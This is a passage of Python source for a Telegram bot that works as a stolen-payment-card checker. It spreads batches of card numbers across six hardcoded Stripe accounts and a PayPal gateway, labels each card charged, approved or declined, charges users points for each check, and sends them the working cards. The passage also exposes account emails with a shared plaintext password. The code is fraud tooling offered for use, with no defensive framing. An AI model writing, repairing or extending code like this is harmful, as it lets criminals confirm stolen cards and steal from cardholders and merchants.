                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {'status': 'start'}

                cards_queue = queue.Queue()
                for cc in lino:
                    if cc.strip():
                        cards_queue.put(cc.strip())

                stripe_accounts = [
                    {"email": "nmn45746@gmail.com", "pass": "Amr01143052861"},
                    {"email": "moraki9322@veospot.com", "pass": "Amr01143052861"},
                    {"email": "tejim42701@veospot.com", "pass": "Amr01143052861"},
                    {"email": "widinej121@woraco.com", "pass": "Amr01143052861"},
                    {"email": "xikoj52187@woraco.com", "pass": "Amr01143052861"},
                    {"email": "gololig100@woraco.com", "pass": "Amr01143052861"}
                ]

                def worker_thread(account_info):
                    while not cards_queue.empty():
                        current_points = get_user_points(user_id)
                        if current_points < 1:
                            break
                        if stopuser[f'{id}']['status'] == 'stop':
                            break
                        
                        try:
                            cc = cards_queue.get_nowait()
                        except queue.Empty:
                            break
                        
                        info = dato(cc[:6])
                        start_time = time.time()
                        
                        try:
                            if gate_type == 'stripe':
                                raw_response = str(stripe_checker(cc, email_account=account_info))
                            else:
                                raw_response = paypal_gateway.process(cc, amount)
                        except Exception as e:
                            raw_response = "ERROR"
                        
                        category = classify_response(raw_response)
                        deduct_user_points(user_id, 1)
                        
                        with stats_lock:
                            stats['cards_checked'] += 1
                            if category == 'charged':
                                stats['live'] += 1
                            elif category == 'approved':
                                stats['ccnn'] += 1
                            else:
                                stats['dd'] += 1
                            
                            cards_checked = stats['cards_checked']
                            live = stats['live']
                            ccnn = stats['ccnn']
                            dd = stats['dd']

                        if category == 'charged':
                            status_text = "Charged"
                            response_text = f"Charged {amount}"
                        elif category == 'approved':
                            status_text = "Approved"
                            response_text = f"{raw_response}"
                        else:
                            status_text = "Declined"
                            response_text = f"{raw_response}"
                        
                        short_response = response_text[:30] + "..." if len(response_text) > 30 else response_text

                        pct = (cards_checked / total) * 100 if total > 0 else 0
                        filled = int(15 * cards_checked // total) if total > 0 else 0
                        bar = '▰' * filled + '▱' * (15 - filled)
                        elapsed = time.time() - scan_start
                        avg = (elapsed / cards_checked) if cards_checked > 0 else 0
                        eta = avg * (total - cards_checked)

                        dash_text = (
                            f"Gate: {gate_label}\n"
                            f"--------------------\n"
                            f"[{bar}] {pct:.1f}%\n"
                            f"--------------------\n"
                            f"ETA: {eta:.0f}s | Elapsed: {elapsed:.0f}s\n"
                            f"Bot By @z_0_y2"
                        )

                        mes = types.InlineKeyboardMarkup(row_width=1)
                        mes.add(
                            types.InlineKeyboardButton(text=f"\u2022 {cc} \u2022", callback_data='u8'),
                            types.InlineKeyboardButton(text=f"[\u03df] Status: {status_text}", callback_data='u8'),
                            types.InlineKeyboardButton(text=f"[\u03df] Response: {short_response}", callback_data='u8')
                        )
                        mes.row(
                            types.InlineKeyboardButton(text=f"Charged🔥 >> [ {live} ]", callback_data='x'),
                            types.InlineKeyboardButton(text=f"Approved✅ >> [ {ccnn} ]", callback_data='x')
                        )
                        mes.row(
                            types.InlineKeyboardButton(text=f"Declined❌ >> [ {dd} ]", callback_data='x'),
                            types.InlineKeyboardButton(text=f"Total⚡ >> [ {total} ]", callback_data='x')
                        )
                        mes.add(types.InlineKeyboardButton(text="Stop⛔", callback_data='stop'))
                        
                        execution_time = time.time() - start_time
                        try:
                            bot.edit_message_text(
                                chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                text=dash_text,
                                reply_markup=mes
                            )
                        except:
                            pass
                        
                        if category in ('charged', 'approved'):
                            msg_premium, msg_fallback = format_check_msg(cc, category, raw_response, info, execution_time, call.from_user.first_name, gate_label, amount)
                            try:
                                bot.send_message(call.from_user.id, msg_premium, parse_mode='HTML', disable_web_page_preview=False)
                            except:
                                try:
                                    bot.send_message(call.from_user.id, msg_fallback, parse_mode='HTML', disable_web_page_preview=False)
                                except:
                                    pass
                        cards_queue.task_done()
                        time.sleep(2)

                with ThreadPoolExecutor(max_workers=6) as executor:
                    executor.map(worker_thread, stripe_accounts)

                current_points = get_user_points(user_id)
                if current_points < 1:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='\u274C Your points ran out! Scan stopped.')
                    return
                if stopuser[f'{id}']['status'] == 'stop':
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='\u26D4 Scan stopped by user.')
                    return

        except Exception as e:
            print(e)
        finally:
            if user_id in active_scans:
                active_scans.remove(user_id)
        stopuser[f'{id}']['status'] = 'start'
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Scan Complete\nBot By @z_0_y2')
    threading.Thread(target=my_function).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    bot.answer_callback_query(call.id, "تم إيقاف الفحص")

if __name__ == "__main__":
    initialize_data_file()
    print("تم تشغيل البوت ✅")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"خطأ: {e}")
